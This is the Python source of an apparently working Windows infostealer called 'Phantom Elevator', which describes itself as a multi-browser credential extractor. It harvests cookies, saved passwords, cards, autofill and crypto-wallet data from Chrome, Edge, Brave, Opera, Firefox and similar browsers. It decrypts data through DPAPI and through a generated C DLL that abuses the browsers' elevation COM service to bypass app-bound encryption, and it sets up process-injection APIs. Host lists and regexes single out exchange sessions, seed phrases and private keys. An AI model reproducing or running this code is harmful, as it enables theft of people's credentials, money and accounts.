import argparse
import base64
import collections
import csv
import ctypes
import ctypes.wintypes as wt
import datetime
import hashlib
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

__version__ = "1.0.0"
__author__ = "Hidden-Rhythm"
__github__ = "https://github.com/Hidden-Rhythm"
__discord__ = "hidden_rhythm"
__tool__ = "Phantom Elevator"
__all__ = ["main", "BROWSERS", "FIREFOX", "extract"]

DEFAULT_RETRIES = 5
DEFAULT_TIMEOUT = 30
COOKIE_FORMAT = "netscape"
PASSWORD_FORMAT = "tsv"

ALL_CATS = (
    "cookies", "passwords", "history", "autofill", "cards",
    "local_storage", "bookmarks", "extensions", "crypto",
)
DEFAULT_CATS = ALL_CATS


class C:
    R       = "\033[0m"
    B       = "\033[1m"
    D       = "\033[2m"
    CYN     = "\033[38;5;111m"
    GRY     = "\033[38;5;245m"
    DIM     = "\033[38;5;240m"
    FAINT   = "\033[38;5;238m"
    TEXT    = "\033[38;5;252m"
    GRN     = "\033[38;5;114m"
    RED     = "\033[38;5;210m"
    YEL     = "\033[38;5;223m"
    BLU     = "\033[38;5;111m"
    MAG     = "\033[38;5;177m"


_NO_COLOR = False


def _enable_ansi():
    if os.name != "nt":
        return
    try:
        k = ctypes.windll.kernel32
        h = k.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        if k.GetConsoleMode(h, ctypes.byref(mode)):
            k.SetConsoleMode(h, mode.value | 0x0004)
    except Exception:
        pass


def _set_no_color(flag: bool):
    global _NO_COLOR
    _NO_COLOR = flag
    if flag:
        for attr in dir(C):
            if not attr.startswith("_"):
                setattr(C, attr, "")


def _strip_colors(s: str) -> str:
    return re.sub(r"\033\[[0-9;]*m", "", s)


def _width(s: str) -> int:
    return len(_strip_colors(s))


def _pad(s: str, n: int, align: str = "left") -> str:
    w = _width(s)
    if w >= n:
        return s
    pad = n - w
    if align == "left":
        return s + " " * pad
    if align == "right":
        return " " * pad + s
    left = pad // 2
    return " " * left + s + " " * (pad - left)


_BOX_INNER = 62


def _box_top(inner: int = _BOX_INNER) -> None:
    print(f"  {C.DIM}╭{'─' * inner}╮{C.R}")


def _box_bot(inner: int = _BOX_INNER) -> None:
    print(f"  {C.DIM}╰{'─' * inner}╯{C.R}")


def _box_row(content: str, inner: int = _BOX_INNER) -> None:
    pad = " " * max(0, inner - 1 - _width(content))
    print(f"  {C.DIM}│{C.R} {content}{pad}{C.DIM}│{C.R}")


def banner(quiet: bool = False) -> None:
    if quiet:
        return
    print()
    _box_top()
    _box_row("")
    _box_row(f"{C.CYN}◈{C.R}   {C.B}{C.TEXT}PHANTOM ELEVATOR{C.R}")
    _box_row("")
    _box_row(f"    {C.GRY}multi-browser credential extractor{C.R}")
    _box_row("")
    _box_row(f"    {C.FAINT}v{__version__}  ·  https://github.com/Hidden-Rhythm{C.R}")
    _box_row(f"    {C.FAINT}discord  hidden_rhythm{C.R}")
    _box_row("")
    _box_bot()
    print()


def err(msg: str) -> None:
    print(f"  {C.RED}✗{C.R}  {msg}", file=sys.stderr)


def ok(msg: str, detail: str = "") -> None:
    suf = f"  {C.FAINT}{detail}{C.R}" if detail else ""
    print(f"  {C.GRN}✓{C.R}  {msg}{suf}")


def info(msg: str) -> None:
    print(f"  {C.CYN}▸{C.R}  {msg}")


def warn(msg: str) -> None:
    print(f"  {C.YEL}!{C.R}  {msg}")


class Spinner:
    FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    INTERVAL = 0.11

    def __init__(self, message: str, enabled: bool = True):
        self.message = message
        self.enabled = enabled
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._finished = False

    def __enter__(self):
        if not self.enabled:
            return self
        self._thread = threading.Thread(target=self._spin, daemon=True)
        self._thread.start()
        return self

    def _spin(self) -> None:
        i = 0
        while not self._stop.is_set():
            ch = self.FRAMES[i % len(self.FRAMES)]
            sys.stdout.write(
                f"\r    {C.CYN}{ch}{C.R}  {C.GRY}{self.message}{C.R}  "
            )
            sys.stdout.flush()
            i += 1
            time.sleep(self.INTERVAL)

    def _shutdown(self) -> None:
        if self._thread:
            self._stop.set()
            self._thread.join(timeout=0.5)
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()

    def __exit__(self, *_):
        if self._finished:
            return
        self._shutdown()

    def ok(self, detail: str = "") -> None:
        self._shutdown()
        self._finished = True
        suffix = f"  {C.FAINT}{detail}{C.R}" if detail else ""
        print(f"    {C.GRN}✓{C.R}  {self.message}{suffix}")

    def fail(self, detail: str = "") -> None:
        self._shutdown()
        self._finished = True
        suffix = f"  {C.FAINT}{detail}{C.R}" if detail else ""
        print(f"    {C.YEL}·{C.R}  {self.message}{suffix}")


_BOOTSTRAPPED = False


def _find_gcc() -> Optional[str]:
    for name in ("gcc", "x86_64-w64-mingw32-gcc"):
        p = shutil.which(name)
        if p:
            return p
    return None


def _refresh_path() -> None:
    if os.name != "nt":
        return
    try:
        import winreg
        cur = os.environ.get("PATH", "")
        seen = {p.lower() for p in cur.split(os.pathsep) if p}
        for hive, key in (
            (winreg.HKEY_LOCAL_MACHINE,
             r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment"),
            (winreg.HKEY_CURRENT_USER, r"Environment"),
        ):
            try:
                with winreg.OpenKey(hive, key) as k:
                    v, _ = winreg.QueryValueEx(k, "Path")
            except OSError:
                continue
            for entry in v.split(os.pathsep):
                if entry and entry.lower() not in seen:
                    cur = entry + os.pathsep + cur
                    seen.add(entry.lower())
        os.environ["PATH"] = cur
    except Exception:
        pass


def _install_gcc_winget() -> bool:
    if not shutil.which("winget"):
        return False
    try:
        r = subprocess.run(
            ["winget", "install", "--id", "BrechtSanders.WinLibs.POSIX.UCRT",
             "-e", "--silent",
             "--accept-package-agreements",
             "--accept-source-agreements"],
            capture_output=True, text=True, timeout=900,
        )
        if r.returncode == 0:
            _refresh_path()
            return _find_gcc() is not None
    except Exception:
        pass
    return False


def _install_gcc_choco() -> bool:
    if not shutil.which("choco"):
        return False
    try:
        subprocess.run(
            ["choco", "install", "mingw", "-y", "--no-progress"],
            capture_output=True, text=True, timeout=900,
        )
        _refresh_path()
        return _find_gcc() is not None
    except Exception:
        return False


def _install_gcc_scoop() -> bool:
    if not shutil.which("scoop"):
        return False
    try:
        subprocess.run(
            ["scoop", "install", "gcc"],
            capture_output=True, text=True, timeout=900,
        )
        _refresh_path()
        return _find_gcc() is not None
    except Exception:
        return False


def _ensure_gcc() -> bool:
    if _find_gcc():
        return True
    if os.name != "nt":
        return False
    for installer, label in (
        (_install_gcc_winget, "winget"),
        (_install_gcc_choco, "choco"),
        (_install_gcc_scoop, "scoop"),
    ):
        print(f"    {C.YEL}↓{C.R}  installing gcc via {label}…", file=sys.stderr)
        if installer():
            print(f"    {C.GRN}✓{C.R}  gcc ready", file=sys.stderr)
            return True
    print(f"    {C.YEL}!{C.R}  gcc not available — ABE/v20 decryption "
          f"will be disabled", file=sys.stderr)
    return False


def _ensure_pycryptodome() -> None:
    try:
        import Crypto.Cipher.AES  # noqa: F401
        return
    except ImportError:
        pass

    print(f"    {C.YEL}↓{C.R}  installing pycryptodome…", file=sys.stderr)
    for flags in (["--quiet"], ["--quiet", "--user"]):
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install",
                 "--disable-pip-version-check", *flags, "pycryptodome"],
                check=True, capture_output=True, text=True, timeout=180,
            )
            try:
                import site
                site.addsitedir(site.getusersitepackages())
            except Exception:
                pass
            import importlib
            importlib.invalidate_caches()
            try:
                import Crypto.Cipher.AES  # noqa: F401
                print(f"    {C.GRN}✓{C.R}  pycryptodome ready", file=sys.stderr)
                return
            except ImportError:
                continue
        except Exception:
            continue

    print(f"  {C.RED}✗{C.R}  pycryptodome install failed — "
          f"run manually: pip install pycryptodome", file=sys.stderr)
    sys.exit(1)


def _ensure_snappy() -> None:
    try:
        import snappy  # noqa: F401
        return
    except ImportError:
        pass
    try:
        subprocess.run(
            [sys.executable, "-m", "pip", "install",
             "--disable-pip-version-check", "--quiet", "python-snappy"],
            capture_output=True, text=True, timeout=180,
        )
    except Exception:
        pass



def _bootstrap() -> None:
    global _BOOTSTRAPPED
    if _BOOTSTRAPPED:
        return
    _BOOTSTRAPPED = True
    _ensure_pycryptodome()
    _ensure_snappy()



class Drops:
    def __init__(self):
        self.counter: Dict[Tuple[str, str], int] = collections.Counter()
        self.detail: Dict[Tuple[str, str], List[dict]] = \
            collections.defaultdict(list)

    def add(self, category: str, reason: str, **kw) -> None:
        key = (category, reason)
        self.counter[key] += 1
        if len(self.detail[key]) < 20:
            self.detail[key].append(kw)

    def merge(self, other: "Drops") -> None:
        self.counter.update(other.counter)
        for k, v in other.detail.items():
            space = 20 - len(self.detail[k])
            if space > 0:
                self.detail[k].extend(v[:space])

    def total(self) -> int:
        return sum(self.counter.values())


@dataclass
class Job:
    kind: str
    data: object
    output: List[str] = field(default_factory=list)
    drops: Drops = field(default_factory=Drops)
    result: Optional[dict] = None
    error: Optional[BaseException] = None


BROWSERS = [
    {
        "name": "Chrome",
        "user_data": os.path.expandvars(r"%LocalAppData%\Google\Chrome\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
                os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe")],
        "cls_id": "{708860E0-F641-4611-8895-7D867DD3675B}",
        "iid_v1": "{463ABECF-410D-407F-8AF5-0DF35A005CC8}",
        "iid_v2": "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
        "services": ["GoogleChromeElevationService"],
        "vtable_offset": 40, "profile_mode": "chromium", "abe": True,
    },
    {
        "name": "Chrome Beta",
        "user_data": os.path.expandvars(r"%LocalAppData%\Google\Chrome Beta\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles%\Google\Chrome Beta\Application\chrome.exe")],
        "cls_id": "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",
        "iid_v1": "{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}",
        "iid_v2": "{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",
        "services": ["GoogleChromeBetaElevationService",
                     "GoogleChromeElevationService"],
        "vtable_offset": 40, "profile_mode": "chromium", "abe": True,
    },
    {
        "name": "Brave",
        "user_data": os.path.expandvars(r"%LocalAppData%\BraveSoftware\Brave-Browser\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe"),
                os.path.expandvars(r"%ProgramFiles(x86)%\BraveSoftware\Brave-Browser\Application\brave.exe")],
        "cls_id": "{576B31AF-6369-4B6B-8560-E4B203A97A8B}",
        "iid_v1": "{F396861E-0C8E-4C71-8256-2FAE6D759CE9}",
        "iid_v2": "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",
        "services": ["BraveElevationService"],
        "vtable_offset": 40, "profile_mode": "chromium", "abe": True,
    },
    {
        "name": "Edge",
        "user_data": os.path.expandvars(r"%LocalAppData%\Microsoft\Edge\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"),
                os.path.expandvars(r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe")],
        "cls_id": "{1FCBE96C-1697-43AF-9140-2897C7C69767}",
        "iid_v1": "{C9C2B807-7731-4F34-81B7-44FF7779522B}",
        "iid_v2": "{8F7B6792-784D-4047-845D-1782EFBEF205}",
        "services": ["MicrosoftEdgeElevationService"],
        "vtable_offset": 64, "profile_mode": "chromium", "abe": True,
    },
    {
        "name": "Avast",
        "user_data": os.path.expandvars(r"%LocalAppData%\AVAST Software\Browser\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles%\AVAST Software\Browser\Application\AvastBrowser.exe")],
        "cls_id": "{EAD34EE8-8D08-4CA1-ADA3-64754374D811}",
        "iid_v1": "{7737BB9F-BAC1-4C71-A696-7C82D7994B6F}",
        "iid_v2": "", "services": ["AvastBrowserElevationService"],
        "vtable_offset": 40, "profile_mode": "chromium", "abe": True,
    },
    {
        "name": "Vivaldi",
        "user_data": os.path.expandvars(r"%LocalAppData%\Vivaldi\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles%\Vivaldi\Application\vivaldi.exe"),
                os.path.expandvars(r"%LocalAppData%\Vivaldi\Application\vivaldi.exe")],
        "cls_id": "", "iid_v1": "", "iid_v2": "", "services": [],
        "vtable_offset": 0, "profile_mode": "chromium", "abe": False,
    },
    {
        "name": "Chromium",
        "user_data": os.path.expandvars(r"%LocalAppData%\Chromium\User Data"),
        "exe": [os.path.expandvars(r"%ProgramFiles%\Chromium\Application\chrome.exe")],
        "cls_id": "", "iid_v1": "", "iid_v2": "", "services": [],
        "vtable_offset": 0, "profile_mode": "chromium", "abe": False,
    },
    {
        "name": "Opera",
        "user_data": os.path.expandvars(r"%AppData%\Opera Software\Opera Stable"),
        "exe": [os.path.expandvars(r"%LocalAppData%\Programs\Opera\opera.exe"),
                os.path.expandvars(r"%ProgramFiles%\Opera\opera.exe")],
        "cls_id": "", "iid_v1": "", "iid_v2": "", "services": [],
        "vtable_offset": 0, "profile_mode": "single", "abe": False,
    },
    {
        "name": "Opera GX",
        "user_data": os.path.expandvars(r"%AppData%\Opera Software\Opera GX Stable"),
        "exe": [os.path.expandvars(r"%LocalAppData%\Programs\Opera GX\opera.exe")],
        "cls_id": "", "iid_v1": "", "iid_v2": "", "services": [],
        "vtable_offset": 0, "profile_mode": "single", "abe": False,
    },
]

FIREFOX = [
    ("Firefox",   os.path.expandvars(r"%AppData%\Mozilla\Firefox")),
    ("Waterfox",  os.path.expandvars(r"%AppData%\Waterfox")),
    ("LibreWolf", os.path.expandvars(r"%AppData%\librewolf")),
    ("Floorp",    os.path.expandvars(r"%AppData%\Floorp")),
    ("Zen",       os.path.expandvars(r"%AppData%\zen")),
]

_FIREFOX_EXE_PATHS = {
    "Firefox": [
        os.path.expandvars(r"%ProgramFiles%\Mozilla Firefox\firefox.exe"),
        os.path.expandvars(r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"),
        os.path.expandvars(r"%LocalAppData%\Programs\Firefox\firefox.exe"),
        os.path.expandvars(r"%LocalAppData%\Mozilla Firefox\firefox.exe"),
    ],
    "Waterfox": [
        r"C:\Program Files\Waterfox\waterfox.exe",
        os.path.expandvars(r"%LocalAppData%\Waterfox\waterfox.exe"),
    ],
    "LibreWolf": [
        r"C:\Program Files\LibreWolf\librewolf.exe",
        os.path.expandvars(r"%LocalAppData%\Programs\LibreWolf\librewolf.exe"),
    ],
    "Floorp": [
        r"C:\Program Files\Floorp\floorp.exe",
        r"C:\Program Files\Ablaze Floorp\floorp.exe",
    ],
    "Zen": [
        r"C:\Program Files\Zen Browser\zen.exe",
        os.path.expandvars(r"%LocalAppData%\Programs\Zen Browser\zen.exe"),
    ],
}

NSS_SEARCH = [
    r"C:\Program Files\Mozilla Firefox",
    r"C:\Program Files (x86)\Mozilla Firefox",
    r"C:\Program Files\Waterfox",
    r"C:\Program Files\LibreWolf",
    r"C:\Program Files\Floorp",
    r"C:\Program Files\Zen Browser",
    r"C:\Program Files\Mozilla Thunderbird",
    r"C:\Program Files (x86)\Mozilla Thunderbird",
    os.path.expandvars(r"%LocalAppData%\Programs\Firefox"),
    os.path.expandvars(r"%LocalAppData%\Mozilla Firefox"),
    os.path.expandvars(r"%LocalAppData%\Programs\LibreWolf"),
    os.path.expandvars(r"%LocalAppData%\Programs\Zen Browser"),
]


def _any_file(paths) -> bool:
    return any(p and os.path.isfile(p) for p in paths)


def _chromium_installed(cfg: dict) -> bool:
    return _any_file(cfg.get("exe", []))


def _firefox_installed(name: str) -> bool:
    return _any_file(_FIREFOX_EXE_PATHS.get(name, []))


def _fmt_bytes(n) -> str:
    if n is None:
        return "—"
    try:
        n = int(n)
    except Exception:
        return "—"
    if n < 1024:
        return f"{n} B"
    size = n / 1024.0
    for unit in ("KB", "MB", "GB", "TB"):
        if size < 1024 or unit == "TB":
            return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} TB"


def _browser_running(exe: Optional[str]) -> bool:
    if not exe:
        return False
    name = os.path.basename(exe)
    try:
        r = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {name}",
                             "/NH", "/FO", "CSV"],
                            capture_output=True, text=True, timeout=5)
        return name.lower() in (r.stdout or "").lower()
    except Exception:
        return False


_IMP_HOSTS = {
    "metamask.io", "phantom.app", "coinbase.com", "binance.com",
    "binance.us", "kraken.com", "okx.com", "kucoin.com", "bybit.com",
    "gate.io", "bitfinex.com", "bitstamp.net", "gemini.com",
    "crypto.com", "robinhood.com", "bitget.com", "mexc.com",
    "htx.com", "uniswap.org", "pancakeswap.finance", "curve.fi",
    "aave.com", "compound.finance", "opensea.io", "blur.io",
    "etherscan.io", "bscscan.com", "solscan.io", "tronscan.org",
    "dune.com", "debank.com", "zapper.xyz", "walletconnect.com",
    "rainbow.me", "rabby.io", "safepal.com", "ledger.com",
    "trezor.io", "trustwallet.com", "phantom.com", "backpack.app",
    "jup.ag", "raydium.io", "orca.so", "magiceden.io", "tensor.trade",
    "accounts.google.com", "login.microsoftonline.com",
    "github.com", "gitlab.com", "auth0.com", "okta.com",
    "discord.com", "slack.com",
}

_IMP_KEY_PAT = re.compile(
    r"(token|jwt|session|auth|api[_-]?key|secret|passw|private[_-]?key"
    r"|privatekey|seed|mnemonic|wallet|keystore|signer|phrase)",
    re.I)

_IMP_VAL_PAT = re.compile(
    r"(mnemonic|private[_ ]?key|seed[_ ]?phrase"
    r"|0x[a-fA-F0-9]{40,64}"
    r"|bc1[a-z0-9]{25,62}"
    r"|[13][a-km-zA-HJ-NP-Z1-9]{25,34})")


def _is_important_ls(origin: str, key: str, value: str) -> bool:
    hl = ""
    try:
        hl = (urlparse(origin).hostname or "").lower()
    except Exception:
        hl = ""
    for h in _IMP_HOSTS:
        if hl == h or hl.endswith("." + h):
            return True
    if _IMP_KEY_PAT.search(key or ""):
        return True
    if value and _IMP_VAL_PAT.search(value):
        return True
    return False


def _host_is_important(host: str) -> bool:
    hl = (host or "").lstrip(".").lower()
    if not hl:
        return False
    for h in _IMP_HOSTS:
        if hl == h or hl.endswith("." + h):
            return True
    return False


def _url_is_important(url: str) -> bool:
    try:
        hl = (urlparse(url).hostname or "").lower()
    except Exception:
        return False
    if not hl:
        return False
    for h in _IMP_HOSTS:
        if hl == h or hl.endswith("." + h):
            return True
    return False


if os.name == "nt":
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    for _fn, _args, _ret in [
        ("OpenProcess", [wt.DWORD, wt.BOOL, wt.DWORD], wt.HANDLE),
        ("VirtualAllocEx", [wt.HANDLE, ctypes.c_void_p, ctypes.c_size_t,
                            wt.DWORD, wt.DWORD], ctypes.c_void_p),
        ("WriteProcessMemory", [wt.HANDLE, ctypes.c_void_p, ctypes.c_void_p,
                                ctypes.c_size_t,
                                ctypes.POINTER(ctypes.c_size_t)], wt.BOOL),
        ("GetProcAddress", [wt.HMODULE, wt.LPCSTR], ctypes.c_void_p),
        ("GetModuleHandleW", [wt.LPCWSTR], wt.HMODULE),
        ("CreateRemoteThread", [wt.HANDLE, ctypes.c_void_p, ctypes.c_size_t,
                                ctypes.c_void_p, ctypes.c_void_p, wt.DWORD,
                                ctypes.POINTER(wt.DWORD)], wt.HANDLE),
        ("WaitForSingleObject", [wt.HANDLE, wt.DWORD], wt.DWORD),
        ("CloseHandle", [wt.HANDLE], wt.BOOL),
        ("LocalFree", [wt.HANDLE], wt.HANDLE),
        ("CreateFileW", [wt.LPCWSTR, wt.DWORD, wt.DWORD, ctypes.c_void_p,
                         wt.DWORD, wt.DWORD, wt.HANDLE], wt.HANDLE),
        ("ReadFile", [wt.HANDLE, ctypes.c_void_p, wt.DWORD,
                      ctypes.POINTER(wt.DWORD), ctypes.c_void_p], wt.BOOL),
    ]:
        _f = getattr(k32, _fn)
        _f.restype = _ret
        _f.argtypes = _args


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]


if os.name == "nt":
    crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
    crypt32.CryptUnprotectData.restype = wt.BOOL
    crypt32.CryptUnprotectData.argtypes = [
        ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.POINTER(DATA_BLOB),
        ctypes.c_void_p, ctypes.c_void_p, wt.DWORD, ctypes.POINTER(DATA_BLOB),
    ]


def dpapi_unprotect(blob: bytes) -> Optional[bytes]:
    if not blob:
        return None
    buf = ctypes.create_string_buffer(blob, len(blob))
    in_b = DATA_BLOB(len(blob),
                     ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    out_b = DATA_BLOB()
    if not crypt32.CryptUnprotectData(
            ctypes.byref(in_b), None, None, None, None, 0,
            ctypes.byref(out_b)):
        return None
    try:
        return ctypes.string_at(out_b.pbData, out_b.cbData)
    finally:
        k32.LocalFree(out_b.pbData)


ABE_TEMPLATE = "\n".join([
    "",
    "#include <windows.h>",
    "#include <objbase.h>",
    "#include <stdlib.h>",
    "",
    "static const CLSID CLSID_B = @@CLSID@@;",
    "static const IID   IID_V1  = @@IID_V1@@;",
    "static const IID   IID_V2  = @@IID_V2@@;",
    "",
    "typedef HRESULT (STDMETHODCALLTYPE* PD)(void*, BSTR, BSTR*, DWORD*);",
    "typedef ULONG  (STDMETHODCALLTYPE* PR)(void*);",
    "",
    "static void BP(char* o, const char* n) {",
    "    char t[MAX_PATH]; GetTempPathA(MAX_PATH, t);",
    '    wsprintfA(o, "%s%s", t, n);',
    "}",
    "static void WE(const char* m) {",
    '    char p[MAX_PATH]; BP(p, "ph_err.txt");',
    "    HANDLE h = CreateFileA(p, GENERIC_WRITE, 0, NULL,",
    "                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);",
    "    if (h != INVALID_HANDLE_VALUE) {",
    "        DWORD w; WriteFile(h, m, lstrlenA(m), &w, NULL);",
    "        CloseHandle(h);",
    "    }",
    "}",
    "static int _is_callable(const void* p) {",
    "    MEMORY_BASIC_INFORMATION mbi;",
    "    if (!VirtualQuery(p, &mbi, sizeof(mbi))) return 0;",
    "    if (mbi.State != MEM_COMMIT) return 0;",
    "    DWORD pr = mbi.Protect;",
    "    return (pr & (PAGE_EXECUTE | PAGE_EXECUTE_READ",
    "                  | PAGE_EXECUTE_READWRITE",
    "                  | PAGE_EXECUTE_WRITECOPY)) != 0;",
    "}",
    "",
    "static DWORD WINAPI W(LPVOID p) {",
    "    (void)p;",
    "    char ip[MAX_PATH], op[MAX_PATH];",
    '    BP(ip, "ph_in.bin"); BP(op, "ph_out.bin");',
    "",
    "    HANDLE h = CreateFileA(ip, GENERIC_READ, FILE_SHARE_READ, NULL,",
    "                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);",
    '    if (h == INVALID_HANDLE_VALUE) { WE("no input"); return 1; }',
    "    DWORD sz = GetFileSize(h, NULL);",
    '    if (sz == 0 || sz > 0x10000) { CloseHandle(h); WE("bad size"); return 2; }',
    "    unsigned char* e = malloc(sz);",
    "    DWORD rd = 0; ReadFile(h, e, sz, &rd, NULL); CloseHandle(h);",
    '    if (rd != sz) { free(e); WE("short read"); return 3; }',
    "",
    "    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);",
    '    if (FAILED(hr)) { free(e); WE("CoInit"); return 4; }',
    "",
    "    void* ev = NULL;",
    "    HRESULT lh = E_NOINTERFACE;",
    "    @@V2_ATTEMPT@@",
    "    if (!ev) {",
    "        hr = CoCreateInstance(&CLSID_B, NULL, CLSCTX_LOCAL_SERVER,",
    "                              &IID_V1, &ev);",
    "        if (FAILED(hr) || !ev) {",
    "            char m[200];",
    '            wsprintfA(m, "CoCreate 0x%08lx 0x%08lx",',
    "                      (unsigned long)lh, (unsigned long)hr);",
    "            WE(m); CoUninitialize(); free(e); return 5;",
    "        }",
    "    }",
    "",
    "    hr = CoSetProxyBlanket((IUnknown*)ev, RPC_C_AUTHN_DEFAULT,",
    "                           RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,",
    "                           RPC_C_AUTHN_LEVEL_PKT_PRIVACY,",
    "                           RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);",
    "    if (FAILED(hr)) {",
    "        char m[120];",
    '        wsprintfA(m, "Blanket 0x%08lx", (unsigned long)hr);',
    "        WE(m);",
    "        ((PR)(*(void***)ev)[2])(ev);",
    "        CoUninitialize(); free(e);",
    "        return 7;",
    "    }",
    "",
    "    void** vt = *(void***)ev;",
    "    PD d = (PD)vt[@@VT_INDEX@@];",
    "    if (!d || !_is_callable((const void*)d)) {",
    '        WE("bad vtable slot");',
    "        ((PR)vt[2])(ev); CoUninitialize(); free(e);",
    "        return 8;",
    "    }",
    "    BSTR c = SysAllocStringByteLen((const char*)e, sz);",
    "    BSTR pl = NULL;",
    "    DWORD le = 0;",
    "    HRESULT h2 = d(ev, c, &pl, &le);",
    "    ((PR)vt[2])(ev); CoUninitialize(); free(e);",
    "",
    "    if (FAILED(h2) || !pl) {",
    "        char m[160];",
    '        wsprintfA(m, "Decrypt 0x%08lx err=%lu",',
    "                  (unsigned long)h2, (unsigned long)le);",
    "        WE(m);",
    "        if (c) SysFreeString(c);",
    "        return 6;",
    "    }",
    "",
    "    UINT pn = SysStringByteLen(pl);",
    "    HANDLE o = CreateFileA(op, GENERIC_WRITE, 0, NULL,",
    "                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);",
    "    if (o != INVALID_HANDLE_VALUE) {",
    "        DWORD w; WriteFile(o, pl, pn, &w, NULL); CloseHandle(o);",
    "    }",
    "    SysFreeString(pl); SysFreeString(c);",
    "    return 0;",
    "}",
    "",
    "BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID lp) {",
    "    (void)lp;",
    "    if (r == DLL_PROCESS_ATTACH) {",
    "        DisableThreadLibraryCalls(h);",
    "        HANDLE t = CreateThread(NULL, 0, W, NULL, 0, NULL);",
    "        if (t) CloseHandle(t);",
    "    }",
    "    return TRUE;",
    "}",
    "",
])

_V2_ATTEMPT = (
    "hr = CoCreateInstance(&CLSID_B, NULL, CLSCTX_LOCAL_SERVER,\n"
    "                          &IID_V2, &ev);\n"
    "    if (FAILED(hr) || !ev) { lh = hr; ev = NULL; }"
)


def _guid_to_c(g: str) -> str:
    s = g.strip("{}").replace("-", "")
    d1 = int(s[0:8], 16); d2 = int(s[8:12], 16); d3 = int(s[12:16], 16)
    d4 = [int(s[16 + i * 2:18 + i * 2], 16) for i in range(2)]
    d5 = [int(s[20 + i * 2:22 + i * 2], 16) for i in range(6)]
    b4 = ", ".join(f"0x{b:02X}" for b in d4)
    b5 = ", ".join(f"0x{b:02X}" for b in d5)
    return f"{{0x{d1:08X}, 0x{d2:04X}, 0x{d3:04X}, {{{b4}, {b5}}}}}"


def _compile_abe_dll(cfg: dict) -> Tuple[Optional[str], Optional[str]]:
    tmp = tempfile.mkdtemp(prefix="ph_")
    src = os.path.join(tmp, "ph.c")
    dll = os.path.join(tmp, "ph.dll")

    v2 = _V2_ATTEMPT if cfg.get("iid_v2") else ""
    iid_v2_c = (_guid_to_c(cfg["iid_v2"]) if cfg.get("iid_v2")
                else _guid_to_c(cfg["iid_v1"]))

    code = ABE_TEMPLATE
    code = code.replace("@@CLSID@@", _guid_to_c(cfg["cls_id"]))
    code = code.replace("@@IID_V1@@", _guid_to_c(cfg["iid_v1"]))
    code = code.replace("@@IID_V2@@", iid_v2_c)
    code = code.replace("@@V2_ATTEMPT@@", v2)
    code = code.replace("@@VT_INDEX@@", str(cfg["vtable_offset"] // 8))

    with open(src, "w", encoding="utf-8") as f:
        f.write(code)

    attempts: List[List[str]] = []

    gcc = _find_gcc()
    if gcc:
        attempts.append([gcc, "-shared", "-O2", "-o", dll, src,
                         "-lole32", "-loleaut32", "-luser32",
                         "-static-libgcc"])

    cl = shutil.which("cl")
    if cl:
        attempts.append([cl, "/nologo", "/LD", "/O2", f"/Fe:{dll}", src,
                         "/link", "ole32.lib", "oleaut32.lib",
                         "user32.lib"])

    for cmd in attempts:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True)
            if r.returncode == 0 and os.path.isfile(dll):
                return dll, tmp
        except Exception:
            pass

    shutil.rmtree(tmp, ignore_errors=True)
    return None, None



def _resolve_abe_dll(cfg: dict) -> Tuple[Optional[str], Optional[str]]:
    name = cfg["name"].lower().replace(" ", "_") + ".dll"
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    dll = os.path.join(base, "dlls", name)
    if os.path.isfile(dll):
        return dll, None
    return _compile_abe_dll(cfg)



def _service_state(name: str) -> str:
    try:
        r = subprocess.run(["sc", "query", name],
                           capture_output=True, text=True, timeout=10)
        out = r.stdout
        if "FAILED" in out or "does not exist" in out.lower():
            return "MISSING"
        for line in out.splitlines():
            if "STATE" in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p.isdigit() and i + 1 < len(parts):
                        return parts[i + 1]
    except Exception:
        pass
    return "UNKNOWN"


def _ensure_service(names: List[str], timeout: int = 20) -> Optional[str]:
    for name in names:
        st = _service_state(name)
        if st == "RUNNING":
            return name
        if st in ("STOPPED", "START_PENDING"):
            subprocess.run(["sc", "start", name], capture_output=True)
            end = time.time() + timeout
            while time.time() < end:
                if _service_state(name) == "RUNNING":
                    return name
                time.sleep(1.5)
    return None


